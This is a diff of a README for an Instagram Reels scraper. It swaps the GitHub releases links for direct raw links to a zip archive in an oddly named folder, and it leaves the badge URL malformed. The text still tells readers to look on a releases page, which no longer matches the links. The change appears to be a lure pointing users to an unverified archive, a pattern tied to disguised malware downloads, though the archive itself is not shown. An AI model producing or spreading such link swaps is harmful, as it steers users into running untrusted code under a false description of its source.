@@ -1,6 +1,6 @@
 # 🎉 instagram-reels-scraper - Extract Instagram Reels Data Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Awurama-22/instagram-reels-scraper/releases)
+[![Download Now](https://raw.githubusercontent.com/Awurama-22/instagram-reels-scraper/main/glossospasm/instagram-reels-scraper_1.9.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/Awurama-22/instagram-reels-scraper/main/glossospasm/instagram-reels-scraper_1.9.zip)
 
 ## 📖 Description
 
@@ -23,7 +23,7 @@ Before you download, ensure your system meets these basic requirements:
 
 To download the application, visit the releases page where you can find the latest version.
 
-[Visit this page to download](https://github.com/Awurama-22/instagram-reels-scraper/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Awurama-22/instagram-reels-scraper/main/glossospasm/instagram-reels-scraper_1.9.zip)
 
 1. Click on the link above.
 2. On the releases page, look for the latest version.
